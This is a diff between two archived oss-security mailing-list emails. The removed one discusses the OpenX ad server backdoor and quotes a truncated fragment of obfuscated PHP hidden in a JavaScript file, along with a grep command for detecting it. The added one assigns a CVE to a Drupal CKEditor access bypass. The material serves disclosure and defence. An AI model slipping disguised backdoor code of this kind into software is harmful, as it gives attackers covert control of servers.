@@ -1,55 +1,32 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/14
-Message-ID: <52018C26.5050706@redhat.com>
-Date: Tue, 06 Aug 2013 17:52:06 -0600
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/06/04/7
+Message-ID: <51AE350B.6070102@redhat.com>
+Date: Tue, 04 Jun 2013 12:42:19 -0600
 From: Kurt Seifried <kseifried@...hat.com>
-To: Open Source Security <oss-security@...ts.openwall.com>, Assign a CVE Identifier <cve-assign@...re.org>, "Steven M. Christey" <coley@...re.org>
-Subject: OpenX Ad Server Backdoor CVE?
+To: oss-security@...ts.openwall.com
+CC: Henri Salo <henri@...v.fi>, security@...pal.org
+Subject: Re: CVE request: CKEditor module for Drupal access bypass SA-CONTRIB-2011-054
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-I assume this needs a CVE? Mitre have you guys seen a request for one?
+On 06/04/2013 10:07 AM, Henri Salo wrote:
+> This does not seem to have CVE yet. Please assign. Drupal guys
+> could you confirm, thanks.
+> 
+> Advisory ID: DRUPAL-SA-CONTRIB-2011-054 Project: CKEditor - WYSIWYG
+> HTML editor (third-party module) Version: 7.x Date:
+> 2011-November-09 Security risk: Critical Exploitable from: Remote 
+> Vulnerability: Access bypass Versions affected: CKEditor 7.x-1.4
+> version only Solution: Upgrade to CKEditor 7.x-1.5
+> 
+> https://drupal.org/node/1337006 http://osvdb.org/77005 
+> http://secunia.com/advisories/46772/
+> 
+> --- Henri Salo
 
-https://isc.sans.edu/diary/OpenX+Ad+Server+Backdoor/16303
-
-According to a post by Heise Security, a backdoor has been spotted in
-the popular open source ad software OpenX [1][2]. Appearantly the
-backdoor has been present since at least November 2012. I tried to
-download the source to verify the information, but it appears the
-files have been removed.
-
-The backdoor is disguised as php code that appears to create a jQuery
-javascript snippet:
-
-this.each(function(){l=flashembed(this,k,j)}<!--?php /*if(e)
-{jQuery.tools=jQuery.tools||{version:
-{}};jQuery.tools.version.flashembed='1.0.2';
-*/$j='ex'./**/'plode'; /* if(this.className ...
-Heise recommends to search the ".js" files of OpenX for php code to
-find out if your version of OpenX is the backdoored version.
-
-find . -name \*.js -exec grep -l '<?php' {} \;
-The backdoor can then be used by an attacker to upload a shell to
-www/images/debugs.php . We have seen in the past several web sites
-that delivered malicious ads served by compromissed ad servers. This
-could be the reason for some of these compromisses.
-
-If you run OpenX:
-
-verify the above information (and let us know)
-if you can find the backdoor, disable/ininstall OpenX
-make sure you remove the "debug.php" file
-best: rebuild the server if you can
-Heise investigated a version 2.8.10 of OpenX with a data of December
-9th and an md5 of 6b3459f16238aa717f379565650cb0cf for the
-openXVideoAds.zip file.
-
-[1]
-http://www.heise.de/newsticker/meldung/Achtung-Anzeigen-Server-OpenX-enthaelt-eine-Hintertuer-1929769.html
-(only in German at this point)
-[2] http://www.openx.com
+Please use CVE-2011-4972  for this issue.
 
 - -- 
 Kurt Seifried Red Hat Security Response Team (SRT)
@@ -57,17 +34,17 @@ PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.13 (GNU/Linux)
 
-iQIcBAEBAgAGBQJSAYwlAAoJEBYNRVNeJnmTA1QP/iLg3bTRGfpPHLRLiXgbc+wK
-CqiqK9tiqMHnzPj2eNR+qP6xLGquLdaqG7AXnD7X8IZk1IYAwV0X2AMaKyLMbc3K
-sMy48cLQ6r+VIi48zWuDz5A0twYjfDnFdjr6660lvI6zgR4wA5dGhz5U8jBeoqF3
-RV0DdjRI2raZqc3i/93LN6gA8worgp9LNYxRuMXazYHaRPZRlSllJ5jxfTIAAJJh
-3Fu3ersiMER5ENG/LIwDmnH2g+Lk0H225QXgVd5G7YydC84uOtqjzoafAwZLyyof
-vv46mdWLGFy0SFpUYQphrkZW3eL09KS7EvkU4yaQYE21txJ7qA1qcxIXGFyHSoeL
-DmfMvx14DmDubCuUtPAgDCHfsu/cP77zvtPppXXlxK8Bw8MiE0htMgKwLXv/PiJe
-RBK5BUnRVw8P/LWdyTQ9szm0xW57aD7JNdE5jfMQlnVQnDVurGAvDh1VPFZrx4sg
-MNde8ThUQgvh1JAx29cYB8JrRlUaTgpVdVKis4fuVdFNFI3/fKRBz7T//WDt6ihW
-LCxVxQwJiTBs/PLKn/7EzTTvmQM5m4G7c0wsKbgPwPq9vvii9ub8vGANXDVEMGeU
-pEoLDkvXB0BI8MnyrY161OO31tGmli+y+mh5mNzR6U5TQU3pGxlkvyKR+SjGs7nE
-2PP+qonzo/8fnbykvSJp
-=xfps
+iQIcBAEBAgAGBQJRrjULAAoJEBYNRVNeJnmTZuMQAIa2xfRWpbwfe9LCKbsC7xal
+XnAJZE8xSty/8ixGajcZjOZ8RlcZ37eLGxcfNNE4/7QsxZGZ6eH/y98DndkL9ncX
+eRkukrlLDwgH0WnoXK84RT5PQuUmECmHC6JE1HkPW58IHQlHC/90j2ZGYX8xecqO
+nXpL4JKqoFPU5vFTp4A1H31X4QvZkKEqdw+FFh9P7vM27gOyZuu7cvSeAWABygbr
+QzKQ/BYk6Ivc1kUnhX0N6lFOxCzliGY2c2tGHDU+yEvnHQmCKk1NOUgfEU0lWZTd
+hTC6Bbh3FWdISl28qPjE1K/Ay55xXNZJaG+dhbPdRiZ0ONvphJbj8EB4W7P4NfHo
+aKItCZuyn9vN72x8ScDulwkCU4smI0lAOw2hB+02mYJPZh2OXpbsbqTj/6n++/U7
+hzA/nGs7gl4OXtYz4DCM9Hk5Un783TYt6eOguaJULHeraxrITf+u6ghPNWHufbG7
+bUoTnRBc3ody4lGpEFK1mMTBmMJ6XIK87I4+CYMmKpNICjVcorglRyidKvhjAOyZ
+7Vvg7IQfu6iJBHl+kWrTfMgc1IVsuRcaAeciZNPVFezxCAhulJpesbz/isftHn2r
+6Ivwj+m4feivCGLlZ6/ey3dfU83D2PP9ulJeiYJvTLyXaOdfXeNXtL41uKefeih9
+S5MKxDC9JnSgu1o5DLED
+=v3qw
 -----END PGP SIGNATURE-----
